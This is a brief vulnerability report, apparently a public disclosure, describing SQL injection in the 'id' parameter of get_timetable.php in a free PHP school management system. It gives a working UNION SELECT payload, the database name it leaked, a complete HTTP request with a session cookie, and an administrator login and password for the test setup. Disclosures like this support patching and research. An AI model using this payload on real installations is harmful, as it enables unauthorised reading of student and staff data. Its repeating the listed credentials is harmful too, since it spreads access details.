# Advanced School Management System v1.0 by itsourcecode.com has SQL injection

Login account: suarez081119@gmail.com/12345 (Super Admin account)

vendors: https://itsourcecode.com/free-projects/php-project/advanced-school-management-system-in-php-with-source-code/

Vulnerability File: /school/model/get_timetable.php?id=

Vulnerability location: /school/model/get_timetable.php?id=,id

[+] Payload: /school/model/get_timetable.php?id=-42%20union%20select%201,database(),3,4,5,6,7,8--+ // Leak place ---> id

Current database name: std_db,length is 6


```sql
GET /school/model/get_timetable.php?id=-42%20union%20select%201,database(),3,4,5,6,7,8--+ HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=kh42r202aj35u61brcutn42s96
Connection: close
```

![image](https://user-images.githubusercontent.com/54017627/171970902-bcf8f9ba-8b0b-4d6b-8ae1-ab28cd8deff7.png)
